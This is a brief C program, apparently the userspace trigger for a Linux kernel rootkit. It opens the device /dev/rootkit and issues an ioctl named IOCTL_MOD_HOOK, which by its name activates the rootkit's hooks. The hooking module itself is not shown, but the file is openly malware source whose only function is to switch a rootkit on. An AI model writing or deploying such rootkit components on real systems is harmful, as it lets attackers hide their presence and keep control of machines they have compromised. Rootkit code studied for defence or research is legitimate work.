#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main (int argc, char *argv[]) {

        int fd = open("/dev/rootkit", O_RDWR);
        ioctl(fd, IOCTL_MOD_HOOK);

        return 0;
}